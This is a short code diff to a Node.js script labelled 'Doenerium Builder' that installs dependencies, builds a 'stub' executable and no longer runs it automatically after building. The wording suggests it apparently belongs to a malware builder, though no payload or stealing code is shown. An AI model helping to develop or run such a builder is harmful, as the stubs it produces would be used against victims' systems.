@@ -28,7 +28,8 @@ async function main() {
     const start = Date.now();
 
     try {
-	await exec('npm install screenshot-desktop');
+	await exec('npm install -g node-gyp');
+	await exec('npm install sqlite3');
         console.log('Installing dependencies...');
         await exec('npm i');
 
@@ -68,14 +69,14 @@ async function main() {
             notifySuccess(`Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: ${outputFilename}`);
             await exec(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Successfully finished building stub within ${(Date.now() - start) / 1000} seconds: main/build/${outputFilename}', 'Doenerium Builder', 'OK', 'Information')"`);
             await exec(`start explorer "${path.join(CURRENT_DIR, 'build')}"`);
-	    await exec(`"${path.join(CURRENT_DIR, 'build', outputFilename)}"`);
+	    //await exec(`"${path.join(CURRENT_DIR, 'build', outputFilename)}"`);
         }
 
     } catch (error) {
         notifyError('Error:', error.message);
     }
 
-    console.log('Press any key to continue...');
+    console.log('Use main/fix.bat and press any key to continue...');
 }
 
 main();
